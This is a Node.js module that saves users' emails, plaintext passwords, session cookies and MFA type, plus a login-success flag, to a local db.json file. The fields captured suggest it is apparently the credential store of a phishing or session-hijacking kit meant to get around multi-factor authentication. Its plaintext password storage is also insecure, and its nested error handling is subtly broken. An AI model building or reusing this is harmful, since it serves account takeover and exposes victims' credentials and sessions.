/**
 * Database Service
 * Handles user data persistence to db.json
 */

const fs = require('fs').promises;
const path = require('path');
const { PATHS } = require('../config/constants');

/**
 * Load existing user data from db.json
 * @returns {Promise<Object>} User data object
 */
async function loadUserData() {
    try {
        try {
            const data = await fs.readFile(PATHS.DB_FILE, 'utf8');
            const parsed = JSON.parse(data);
            console.log('📁 Loaded existing user data from db.json');
            return parsed.users || {};
        } catch (parseError) {
            console.log('⚠️ db.json exists but has invalid format, creating new structure');
            return {};
        }
    } catch (error) {
        console.log('📁 db.json not found, creating new user storage');
        return {};
    }
}

/**
 * Save user data to db.json with backup
 * @param {string} email - User email
 * @param {string} password - User password
 * @param {Array} cookies - User cookies
 * @param {string} mfaType - MFA type used ('none', 'email', 'phone')
 * @returns {Promise<boolean>} Success status
 */
async function saveUserData(email, password, cookies, mfaType) {
    try {
        // Load existing data
        const userData = await loadUserData();

        // Create user entry
        const userEntry = {
            email: email,
            password: password,
            mfa_type: mfaType,
            cookies: cookies || [],
            last_login: new Date().toISOString(),
            login_success: true
        };

        // Update or add user
        userData[email] = userEntry;

        // Create complete structure
        const dbData = {
            users: userData,
            last_updated: new Date().toISOString(),
            total_users: Object.keys(userData).length
        };

        // Removed backup creation logic per request

        // Save new data
        await fs.writeFile(PATHS.DB_FILE, JSON.stringify(dbData, null, 2));
        console.log(`✅ Successfully saved user data for: ${email}`);
        console.log(`📊 Total users in database: ${Object.keys(userData).length}`);

        return true;
    } catch (error) {
        console.error('❌ Error saving user data:', error.message);
        return false;
    }
}

/**
 * Get user data by email
 * @param {string} email - User email
 * @returns {Promise<Object|null>} User data or null
 */
async function getUserData(email) {
    try {
        const userData = await loadUserData();
        return userData[email] || null;
    } catch (error) {
        console.error('❌ Error getting user data:', error.message);
        return null;
    }
}

/**
 * Get all users
 * @returns {Promise<Object>} All user data
 */
async function getAllUsers() {
    try {
        return await loadUserData();
    } catch (error) {
        console.error('❌ Error getting all users:', error.message);
        return {};
    }
}

/**
 * Delete user data
 * @param {string} email - User email
 * @returns {Promise<boolean>} Success status
 */
async function deleteUserData(email) {
    try {
        const userData = await loadUserData();
        if (userData[email]) {
            delete userData[email];

            const dbData = {
                users: userData,
                last_updated: new Date().toISOString(),
                total_users: Object.keys(userData).length
            };

            await fs.writeFile(PATHS.DB_FILE, JSON.stringify(dbData, null, 2));
            console.log(`✅ Deleted user data for: ${email}`);
            return true;
        }
        return false;
    } catch (error) {
        console.error('❌ Error deleting user data:', error.message);
        return false;
    }
}

module.exports = {
    loadUserData,
    saveUserData,
    getUserData,
    getAllUsers,
    deleteUserData
};

